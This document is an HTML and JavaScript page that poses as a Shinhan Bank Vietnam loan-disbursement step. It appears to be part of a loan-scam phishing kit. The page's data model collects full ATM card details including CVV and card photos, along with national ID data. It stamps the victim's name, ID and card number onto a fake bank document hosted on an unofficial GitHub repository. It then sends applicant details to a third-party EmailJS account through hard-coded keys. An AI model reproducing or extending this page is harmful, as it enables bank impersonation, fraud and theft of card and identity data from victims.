<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Điều Kiện Giải Ngân - Shinhan Bank</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
    <link href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.5/font/bootstrap-icons.css" rel="stylesheet">
    <style>
        body {
            font-family: 'Roboto', sans-serif;
            font-size: 16px;
            margin: 0;
        }
        .header {
            padding: 15px;
            background-color: #ffffff;
            border-bottom: 1px solid #b3cde0;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .header img {
            height: 35px;
        }
        .header-icons {
            display: flex;
            align-items: center;
            gap: 15px;
        }
        .header-icons i {
            font-size: 24px;
            cursor: pointer;
            color: #0052cc;
        }
        .container {
            max-width: 90%;
            width: 100%;
            margin: 15px 5%;
            padding: 15px;
            background: #ffffff;
            border-radius: 10px;
            box-shadow: 0 0 15px rgba(0, 82, 204, 0.1);
        }
        @media (min-width: 768px) {
            .container {
                max-width: 700px;
                margin: 15px 5%;
            }
        }
        .nav-tabs {
            display: flex;
            justify-content: space-around;
            margin-bottom: 15px;
            margin-top: 10px;
            flex-wrap: nowrap;
        }
        .nav-tabs .nav-item {
            flex: 1;
            text-align: center;
        }
        .nav-tabs .nav-link {
            background-color: #d3d3d3;
            color: #ffffff;
            border-radius: 20px;
            padding: 8px 10px;
            font-weight: 500;
            font-size: 12px;
            width: 100%;
            margin: 0 2px;
            white-space: nowrap;
        }
        .nav-tabs .nav-link.active {
            background-color: #0033a0;
            color: #ffffff;
        }
        @media (max-width: 767px) {
            .nav-tabs .nav-link {
                font-size: 10px;
                padding: 6px 8px;
            }
        }
        .section-title {
            color: #0033a0;
            font-size: 18px;
            font-weight: 700;
            margin-bottom: 10px;
            text-transform: uppercase;
            text-align: center;
        }
        .step-description {
            font-size: 14px;
            text-align: center;
            color: #333;
            margin-bottom: 20px;
        }
        .image-section {
            text-align: center;
            margin: 20px 0;
        }
        #disbursementCanvas {
            width: 100%;
            max-width: 600px;
            min-height: 850px;
            margin: 20px auto;
            display: block;
            border: 1px solid #b3cde0;
            border-radius: 8px;
            image-rendering: -webkit-optimize-contrast;
            image-rendering: crisp-edges;
        }
        #disbursementCanvas.loading {
            opacity: 0.5;
            background: url('https://via.placeholder.com/50x50?text=Loading') center center no-repeat;
        }
        .btn-primary {
            background-color: #0033a0;
            border: none;
            border-radius: 20px;
            padding: 8px 16px;
            font-weight: 700;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }
        .btn-primary:hover {
            background-color: #0052cc;
        }
        .btn-secondary {
            background-color: #0033a0;
            border: none;
            border-radius: 20px;
            padding: 8px 16px;
            font-weight: 700;
            font-size: 14px;
            transition: background-color 0.3s ease;
        }
        .btn-secondary:hover {
            background-color: #0052cc;
        }
        .footer {
            background-color: #0033a0;
            color: #ffffff;
            text-align: center;
            padding: 15px;
            font-size: 12px;
        }
        .footer-links a {
            color: #b3cde0;
            margin: 0 8px;
            text-decoration: none;
        }
        .footer-links a:hover {
            color: #ffffff;
        }
        .button-group {
            display: flex;
            justify-content: center;
            gap: 15px;
            margin-top: 15px;
        }
        @media (max-width: 767px) {
            .button-group {
                flex-direction: row;
                justify-content: center;
            }
            .button-group a, .button-group button {
                flex: 1;
                text-align: center;
            }
        }
        .dropdown-menu {
            min-width: 200px;
        }
        .dropdown-menu a {
            color: #0033a0;
            text-transform: uppercase;
            font-size: 14px;
            padding: 8px 12px;
        }
        .dropdown-menu a:hover {
            background-color: #e6f0fa;
            color: #0052cc;
        }
        .step-transition {
            transition: opacity 0.5s ease, transform 0.5s ease;
            opacity: 1;
            transform: translateX(0);
        }
        .step-transition.hidden {
            opacity: 0;
            transform: translateX(20px);
            pointer-events: none;
        }
    </style>
</head>
<body>
    <div class="header">
        <img src="https://shinhan.com.vn/public/themes/shinhan/img/logo-01.svg" alt="Shinhan Bank Logo">
        <div class="header-icons">
            <i class="bi bi-search"></i>
            <div class="dropdown">
                <i class="bi bi-list" data-bs-toggle="dropdown" aria-expanded="false"></i>
                <ul class="dropdown-menu dropdown-menu-end">
                    <li><a class="dropdown-item" href="#">GIỚI THIỆU</a></li>
                    <li><a class="dropdown-item" href="#">LỢI ÍCH</a></li>
                    <li><a class="dropdown-item" href="#">GIẤY TỜ CẦN THIẾT</a></li>
                    <li><a class="dropdown-item" href="#">ĐĂNG KÝ TRỰC TUYẾN</a></li>
                    <li><a class="dropdown-item" href="#">XEM KẾT QUẢ</a></li>
                </ul>
            </div>
        </div>
    </div>

    <div class="container">
        <ul class="nav-tabs">
            <li class="nav-item">
                <a class="nav-link" href="#">1. Nhập thông tin</a>
            </li>
            <li class="nav-item">
                <a class="nav-link" href="#">2. Xác thực và xử lý</a>
            </li>
            <li class="nav-item">
                <a class="nav-link active" href="#">3. Hoàn thành</a>
            </li>
        </ul>

        <div id="step8" class="step-transition">
            <h5 class="section-title">ĐIỀU KIỆN GIẢI NGÂN</h5>
            <p class="step-description">Dưới đây là điều kiện giải ngân của bạn. Vui lòng kiểm tra kỹ thông tin.</p>
            <div class="image-section">
                <canvas id="disbursementCanvas"></canvas>
            </div>
            <div class="button-group">
                <a href="step7.html" class="btn btn-secondary">QUAY LẠI</a>
                <button id="downloadDisbursementBtn" class="btn btn-primary">TẢI ĐIỀU KIỆN GIẢI NGÂN (PDF)</button>
                <button id="proceedToFinalStepBtn" class="btn btn-primary">HOÀN TẤT</button>
            </div>
        </div>
    </div>

    <div class="footer">
        <div class="footer-links">
            <a href="#">Chính sách bảo mật</a> |
            <a href="#">Điều khoản sử dụng</a> |
            <a href="#">Chính sách Cookies</a> |
            <a href="#">Miễn khoản từ chối liên kết bên ngoài</a> |
            <a href="#">Hướng dẫn truy cập web</a> |
            <a href="#">Sitemap</a>
        </div>
        <p class="mt-2">Trung tâm bảo mật | Demo Ngân hàng trực tuyến | Liên hệ | Trang Global Portal | Giới Thiệu</p>
        <p>© 2015 SHINHAN BANK VIETNAM ALL RIGHTS RESERVED.</p>
    </div>

    <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.5.1/jspdf.umd.min.js"></script>
    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
    <script>
        (function(){
            emailjs.init("OrBsI926QI2_xBh1f");
        })();

        let userData = {
            fullName: "",
            idNumber: "",
            idIssueDate: "",
            idIssuePlace: "",
            address: "",
            occupation: "",
            income: "",
            phoneNumber: "",
            email: "",
            loanAmount: "",
            loanTerm: "",
            loanPurpose: "",
            accountNumber: "",
            bankName: "",
            termsAgree: false,
            loanCode: "",
            registrationDate: "",
            monthlyPayment: 0,
            interestRate: 0,
            sellerCode: "",
            storeCode: "",
            staffCode: "",
            staffName: "",
            branchName: "",
            isRegistered: false,
            qrData: {},
            atmCard: {
                cardNumber: "",
                cardHolderName: "",
                issueDate: "",
                expiryDate: "",
                cvv: "",
                frontImage: "",
                backImage: ""
            },
            currentStep: 8
        };

        function formatNumber(number) {
            if (!number) return "Không có";
            return Number(number).toLocaleString('vi-VN');
        }

        function saveToLocalStorage() {
            try {
                localStorage.setItem('userData', JSON.stringify(userData));
                console.log('Saved userData to localStorage:', userData);
            } catch (error) {
                console.error('Error saving userData to localStorage:', error);
            }
        }

        function loadUserData() {
            try {
                const storedData = localStorage.getItem('userData');
                if (storedData) {
                    userData = JSON.parse(storedData);
                    console.log('Loaded userData from localStorage for Step8:', userData);
                } else {
                    console.warn('No userData found in localStorage, using default.');
                }
            } catch (error) {
                console.error('Error parsing userData from localStorage:', error);
            }
        }

        function renderCanvas(canvasId, imageUrl, fallbackUrl) {
            const canvas = document.getElementById(canvasId);
            const ctx = canvas.getContext('2d');
            const img = new Image();
            img.crossOrigin = "Anonymous";
            img.src = imageUrl;

            canvas.classList.add('loading');

            img.onload = function() {
                canvas.classList.remove('loading');
                canvas.width = 2480;
                canvas.height = 3508;
                ctx.drawImage(img, 0, 0, 2480, 3508);
                canvasFields.forEach(field => {
                    const value = field.value || "Không có";
                    if (field.x >= 0 && field.y >= 0 && field.x < canvas.width && field.y < canvas.height) {
                        ctx.font = field.font;
                        ctx.fillStyle = field.color;
                        ctx.fillText(value, field.x, field.y);
                    } else {
                        console.warn(`Invalid coordinates for field: ${value} at (${field.x}, ${field.y})`);
                    }
                });
                console.log('Rendered canvas with fields:', canvasFields.map(f => ({ value: f.value, x: f.x, y: f.y })));
            };

            img.onerror = function() {
                console.error('Failed to load image:', imageUrl);
                img.src = fallbackUrl;
                img.onload = function() {
                    canvas.classList.remove('loading');
                    canvas.width = 2480;
                    canvas.height = 3508;
                    ctx.drawImage(img, 0, 0, 2480, 3508);
                    ctx.fillStyle = '#000000';
                    ctx.font = '46px Arial';
                    ctx.fillText('Hình ảnh điều kiện giải ngân mặc định.', 20, 50);
                };
                img.onerror = function() {
                    canvas.classList.remove('loading');
                    ctx.fillStyle = '#000000';
                    ctx.font = '46px Arial';
                    ctx.fillText('Không thể tải hình ảnh điều kiện giải ngân.', 20, 50);
                };
            };
        }

        const canvasFields = [
            { label: "", value: userData.loanCode || "Không có", x: 414, y: 193, font: "54px Arial bold", color: "#000000" },
            { label: "", value: userData.accountNumber || "Không có", x: 846, y: 643, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.fullName || "Không có", x: 857, y: 707, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.bankName || "Không có", x: 846, y: 780, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.fullName || "Không có", x: 857, y: 887, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idNumber || "Không có", x: 846, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idIssueDate || "Không có", x: 1413, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.idIssuePlace || "Không có", x: 1904, y: 974, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.atmCard?.cardNumber || "Không có", x: 846, y: 1034, font: "46px Arial bold", color: "#000000" },
            { label: "", value: userData.atmCard?.cardHolderName || "Không có", x: 846, y: 1094, font: "46px Arial bold", color: "#000000" }
        ];

        function downloadAsPDF(canvas, filename) {
            const { jsPDF } = window.jspdf;
            const pdf = new jsPDF({
                orientation: canvas.width > canvas.height ? 'landscape' : 'portrait',
                unit: 'px',
                format: [canvas.width, canvas.height]
            });
            pdf.addImage(canvas.toDataURL('image/png'), 'PNG', 0, 0, canvas.width, canvas.height);
            pdf.save(filename);
        }

        window.onload = function() {
            loadUserData();
            renderCanvas('disbursementCanvas', 'https://raw.githubusercontent.com/vaytieudung/shinhanbank/main/assets/img/dieukiengiayngan.png', 'https://via.placeholder.com/2480x3508?text=Hinh+Dieu+Kien+Giai+Ngan');
        };

        $('#downloadDisbursementBtn').on('click', function() {
            const canvas = document.getElementById('disbursementCanvas');
            downloadAsPDF(canvas, `DieuKienGiaiNgan_${userData.loanCode || 'unknown'}.pdf`);
        });

        $('#proceedToFinalStepBtn').on('click', function() {
            const params = {
                to_name: userData.fullName || 'Khách hàng',
                loan_code: userData.loanCode || 'Không có',
                loan_amount: formatNumber(userData.loanAmount) || 'Không có',
                registration_date: userData.registrationDate || 'Không có',
                to_email: userData.email || 'support@shinhan.com.vn'
            };
            emailjs.send('service_60tgxof', 'template_uhyb8ve', params).then(() => {
                userData.isRegistered = true;
                userData.isCompleted = true;
                userData.currentStep = 10;
                saveToLocalStorage();
                window.location.href = 'step10.html';
            }).catch(error => {
                console.error('EmailJS error:', error);
            });
        });
    </script>
</body>
</html>
